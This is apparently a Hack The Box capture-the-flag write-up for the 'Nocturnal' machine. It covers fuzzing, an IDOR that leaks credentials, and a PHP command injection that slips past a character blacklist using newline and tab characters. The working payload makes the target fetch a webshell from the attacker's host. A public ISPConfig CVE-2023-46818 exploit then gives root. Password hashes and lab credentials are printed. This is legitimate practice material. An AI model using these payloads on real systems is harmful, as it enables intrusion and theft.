# Nocturnal

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.64:22
Open 10.10.11.64:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.64

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpf3JJv7Vr55+A/O4p/l+TRCtst7lttqsZHEA42U5Edkqx/Kb8c+F0A4wMCVOMqwyR/PaMdmzAomYGvNYhi3NelwIEqdKKnL+5svrsStqb9XjyShPD9SQK5Su7xBt+/TfJyJFRcsl7ZJdfc6xnNHQITvwa6uZhLsicycj0yf1Mwdzy9hsc8KRY2fhzARBaPUFdG0xte2MkaGXCBuI0tMHsqJpkeZ46MQJbH5oh4zqg2J8KW+m1suAC5toA9kaLgRis8p/wSiLYtsfYyLkOt2U+E+FZs4i3vhVxb9Sjl9QuuhKaGKQN2aKc8ItrK8dxpUbXfHr1Y48HtUejBj+AleMrUMBXQtjzWheSe/dKeZyq8EuCAzeEKdKs4C7ZJITVxEe8toy7jRmBrsDe4oYcQU2J76cvNZomU9VlRv/lkxO6+158WtxqHGTzvaGIZXijIWj62ZrgTS6IpdjP3Yx7KX6bCxpZQ3+jyYN1IdppOzDYRGMjhq5ybD4eI437q6CSL20=
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLcnMmaOpYYv5IoOYfwkaYqI9hP6MhgXCT9Cld1XLFLBhT+9SsJEpV6Ecv+d3A1mEOoFL4sbJlvrt2v5VoHcf4M=
|   256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIASsDOOb+I4J4vIK5Kz0oHmXjwRJMHNJjXKXKsW0z/dy
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (80)

Application has login/register functionality

![Writeup.png](/assets/pentest/htb/nocturnal/Writeup.png)

At the bottom there's support email:
```
If you have any questions or need assistance, please reach out to us at support@nocturnal.htb
```

### Upload File

After signup we get an upload page, but only `pdf, doc, docx, xls, xlsx, odt` are allowed. I first tried JPEG.

![Writeup-1.png](/assets/pentest/htb/nocturnal/Writeup-1.png)

Valid upload: [http://nocturnal.htb/view.php?username=test02&file=preview.pdf](http://nocturnal.htb/view.php?username=test02&file=preview.pdf)

### Fuzzing Files

Initiate passive scan
```bash
â””â”€$ feroxbuster -u 'http://nocturnal.htb/' -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -n -D -C 404,403,400 -S 0,34,2444 -x php -b 'PHPSESSID=7th5j5o6t49csbhqegjvdadf7g'
301      GET        7l       12w      178c http://nocturnal.htb/backups => http://nocturnal.htb/backups/
200      GET      161l      327w     3105c http://nocturnal.htb/style.css
200      GET       28l       45w      685c http://nocturnal.htb/dashboard.php
200      GET       29l      145w     1524c http://nocturnal.htb/index.php
200      GET       21l       45w      649c http://nocturnal.htb/register.php
200      GET       21l       45w      644c http://nocturnal.htb/login.php
302      GET      123l      236w     2919c http://nocturnal.htb/view.php => login.php
```

Nothing from ffuf on backups
```
â””â”€$ ffuf -u 'http://nocturnal.htb/backups/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt -e '.pdf,.doc,.docx,.xls,.xlsx,.odt' -b 'PHPSESSID=7th5j5o6t49csbhqegjvdadf7g' -fl 123,129
```

There's not much to go on, we could try exploiting the upload functionality but to be honest `view.php` is very funky looking

### Fuzzing Usernames

Fuzz usernames
```bash
â””â”€$ ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=letmein.pdf' -w /usr/share/seclists/Usernames/Names/names.txt -b 'PHPSESSID=7th5j5o6t49csbhqegjvdadf7g' -mc all -x http://127.0.0.1:8080 -fr 'User not found.'
admin                   [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 122ms]
amanda                  [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 283ms]
root                    [Status: 200, Size: 3173, Words: 1176, Lines: 129, Duration: 190ms]
tobias                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 236ms]
vladimir                [Status: 200, Size: 3111, Words: 1175, Lines: 129, Duration: 121ms]
```

#### IDOR

We don't know the filenames and while we can also fuzz it the application is nice enough to list other user's files ðŸ˜³

![Writeup-2.png](/assets/pentest/htb/nocturnal/Writeup-2.png)

[http://nocturnal.htb/view.php?username=amanda&file=privacy.odt](http://nocturnal.htb/view.php?username=amanda&file=privacy.odt)

```bash
Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.

Yours sincerely,
Nocturnal's IT team
```

> Creds: `amanda:arHkG7HAI68X8s1J`

### Admin Panel

If we login as `amanda` we get new option to go to `admin.php`

![Writeup-3.png](/assets/pentest/htb/nocturnal/Writeup-3.png)

#### Code Review

We are able to read the source code. LFI doesn't seem possible as `basename` eliminates usage of directory traversal.

![Writeup-4.png](/assets/pentest/htb/nocturnal/Writeup-4.png)

The `password` variable is controlled by us so we could probably get RCE in the `proc_open` function.
```php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];

        $process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }
```

Except shell characters are blocked:
```php
function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}
```

#### RCE

Newline injection is valid for this command since it's running with `shell=True`, smth like:
```php
zip -x './backups/*' -r -P " 
. "echo\tpwned > /tmp/pwned" // $password 
. " " . $backupFile . " .  > " . $logFile . " 2>&1 &
```

> **Note**: Spaces are not allowed, but we can use tabs

```bash
â””â”€$ serve
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.64 - - [17/Apr/2025 14:21:33] "GET /webshell.php HTTP/1.1" 200 -
```

![Writeup-5.png](/assets/pentest/htb/nocturnal/Writeup-5.png)

> `password=%0Awget%0910.10.14.182/webshell.php%0A&backup=`

### Webshell

![Writeup-6.png](/assets/pentest/htb/nocturnal/Writeup-6.png)

```bash
â””â”€$ nano noctural_database.db.b64
â””â”€$ base64 -d noctural_database.db.b64 > noctural_database.db
â””â”€$ sqlite3 noctural_database.db '.tables'
uploads  users

â””â”€$ sqlite3 noctural_database.db '.mode column' 'SELECT * FROM users;'
id  username                                                      password
--  ------------------------------------------------------------  --------------------------------
1   admin                                                         d725aeba143f575736b07e045d8ceebb
2   amanda                                                        df8b20aa0c935023f99ea58358fb63c4
4   tobias                                                        55c82b1ccd55ab219b3b109b07d5061d
6   kavi                                                          f38cde1654b39fea2bd4f72f1ae4cdda
7   e0Al5                                                         101ad4543a96a7fd84908fd0d802e7db
8   hacker                                                        d6a6bc0db10694a2d90e3a69648f3a03
9   seohack                                                       99f9b8735fdac0b0182b15c6e804df48
10  user12                                                        d781eaae8248db6ce1a7b82e58e60435
11  root                                                          63a9f0ea7bb98050796b649e85481845
12  vladimir                                                      5f4dcc3b5aa765d61d8327deb882cf99
13  admin                                                         21232f297a57a5a743894a0e4a801fc3
14  test02                                                        4d5e2a885578299e5a5902ad295447c6
15  admin ... a                                                   21232f297a57a5a743894a0e4a801fc3
16  support@nocturnal.htb                                         63e0f82c111c5be12911c22cc2dcfeb7
17  support@nocturnal.htb;                                        77a3e9db012496ea13615cf0194e7195
18  machiavelli                                                   234e6ebd1d0ddb1a5a39ac0cec6ebe85
19  test1234                                                      16d7a4fca7442dda3ad93c9a726597e4
20  pepe                                                          926e27eecdbc7a18858b3798ba99bddd
21  ale                                                           f7a3803365a55b197a3b43bc64aacc13
```

> **Note**: Playing on public box, so some users are from players

![Writeup-7.png](/assets/pentest/htb/nocturnal/Writeup-7.png)

## SSH (22)

> Creds: `tobias:slowmotionapocalypse`

```bash
â””â”€$ sshpass -p 'slowmotionapocalypse' ssh tobias@nocturnal.htb
Last login: Thu Apr 17 18:32:16 2025 from 10.10.14.182
tobias@nocturnal:~$ id
uid=1000(tobias) gid=1000(tobias) groups=1000(tobias),27(sudo)
```

### User.txt

```
tobias@nocturnal:~$ cat user.txt
e94d956c9e9e114970225db819a602a3
```

## Privilege Escalation

```
tobias@nocturnal:~$ sudo -l
Sorry, user tobias may not run sudo on nocturnal.
```

`/var/www` had more then 2 directories meaning there's more webapps running
```bash
tobias@nocturnal:/var/www$ ls -alh
total 24K
drwxr-xr-x  6 ispconfig ispconfig 4.0K Apr 14 09:26 .
drwxr-xr-x 14 root      root      4.0K Oct 18 00:00 ..
drwxr-xr-x  2 root      root      4.0K Mar  4 15:02 html
lrwxrwxrwx  1 root      root        34 Oct 17  2024 ispconfig -> /usr/local/ispconfig/interface/web
drwxr-xr-x  2 www-data  www-data  4.0K Apr 17 18:38 nocturnal_database
drwxr-xr-x  4 www-data  www-data  4.0K Apr 17 09:02 nocturnal.htb
drwxr-xr-x  4 ispconfig ispconfig 4.0K Oct 17  2024 php-fcgi-scripts

tobias@nocturnal:/var/www$ ss -tunlp4
Netid    State     Recv-Q     Send-Q         Local Address:Port          Peer Address:Port    Process
udp      UNCONN    0          0              127.0.0.53%lo:53                 0.0.0.0:*
tcp      LISTEN    0          151                127.0.0.1:3306               0.0.0.0:*
tcp      LISTEN    0          10                 127.0.0.1:587                0.0.0.0:*
tcp      LISTEN    0          4096               127.0.0.1:8080               0.0.0.0:*
tcp      LISTEN    0          511                  0.0.0.0:80                 0.0.0.0:*
tcp      LISTEN    0          4096           127.0.0.53%lo:53                 0.0.0.0:*
tcp      LISTEN    0          128                  0.0.0.0:22                 0.0.0.0:*
tcp      LISTEN    0          10                 127.0.0.1:25                 0.0.0.0:*
tcp      LISTEN    0          70                 127.0.0.1:33060              0.0.0.0:*

tobias@nocturnal:/var/www$ curl 0:8080 -sL | grep ispconfig
  <link rel='stylesheet' href='../themes/default/assets/stylesheets/ispconfig.css?ver=3.2' />
  <script src='../themes/default/assets/javascripts/ispconfig.js'></script>
  <script type="text/javascript" src="../js/jquery.ispconfigsearch.js"></script>
```

### ISPConfig

Port forward machines port `8080` to our `8000`
```bash
â””â”€$ sshpass -p 'slowmotionapocalypse' ssh tobias@nocturnal.htb -L 8000:0:8080
```

![Writeup-8.png](/assets/pentest/htb/nocturnal/Writeup-8.png)

Trying combinations of `tobias:slowmotionapocalypse` didn't work, but `admin:slowmotionapocalypse` worked.

![Writeup-9.png](/assets/pentest/htb/nocturnal/Writeup-9.png)

Panel > Help > `ISPConfig Version: 3.2.10p1`

[ISPConfig 3.2.11 PHP Code Injection Exploit #8804](https://github.com/projectdiscovery/nuclei-templates/issues/8804)

[ISPConfig <= 3.2.11 (language_edit.php) PHP Code Injection Vulnerability](https://karmainsecurity.com/KIS-2023-13) - [POC](https://karmainsecurity.com/pocs/CVE-2023-46818.php)

[CVE-2023-46818 Python Exploit](https://github.com/ajdumanhug/CVE-2023-46818.git)

```bash
â””â”€$ git clone https://github.com/ajdumanhug/CVE-2023-46818.git
â””â”€$ py CVE-2023-46818/CVE-2023-46818.py http://localhost:8000 admin slowmotionapocalypse
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Login successful!
[+] Fetching CSRF tokens...
[+] CSRF ID: language_edit_01ffc0c5addc0c6a7bfd888c
[+] CSRF Key: ae60cc0dba39a856ea324ec86868491f8ccb9be9
[+] Injecting shell payload...
[+] Shell written to: http://localhost:8000/admin/sh.php
[+] Launching shell...

ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
ispconfig-shell# cat /root/root.txt
0a128872345e4816a3ca6b8b711d3f8a
```